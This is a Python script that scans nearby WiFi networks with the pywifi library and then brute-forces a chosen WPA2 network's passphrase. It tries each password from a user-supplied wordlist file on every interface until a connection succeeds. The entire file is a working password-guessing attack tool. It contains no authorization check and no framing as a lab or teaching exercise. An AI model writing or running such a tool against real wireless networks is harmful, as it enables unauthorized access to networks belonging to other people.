import time
import pywifi
from pywifi import const
import os

def scan_wifi_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Assuming there's only one WiFi interface
    iface.scan()
    time.sleep(2)
    networks = iface.scan_results()
    return networks

def connect_to_network(ssid, password, interface):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[interface]
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)

    time.sleep(5)  # Wait for connection
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def main():
    networks = scan_wifi_networks()
    if not networks:
        print("No WiFi networks found.")
        return

    print("Available WiFi networks:")
    for i, network in enumerate(networks):
        print(f"{i+1}. {network.ssid}")

    selection = int(input("Enter the number corresponding to the network you want to connect to: "))
    if selection < 1 or selection > len(networks):
        print("Invalid selection.")
        return

    selected_network = networks[selection - 1]
    ssid = selected_network.ssid
    print(f"Selected network: {ssid}")

    file_path = input("Enter the file path containing the passwords: ")
    if not os.path.exists(file_path):
        print("File not found. Please check the file path.")
        return

    with open(file_path, 'r') as file:
        passwords = file.read().strip().split('\n')

    interfaces = len(pywifi.PyWiFi().interfaces())
    connected = False
    for i in range(interfaces):
        for password in passwords:
            print(f"Attempting to connect to {ssid} using interface {i} and password {password}...")
            if connect_to_network(ssid, password, i):
                print(f"Successfully connected to {ssid} using interface {i} and password {password}!")
                connected = True
                break
        if connected:
            break

    if not connected:
        print("Connection failed. Please try again.")

if __name__ == "__main__":
    main()
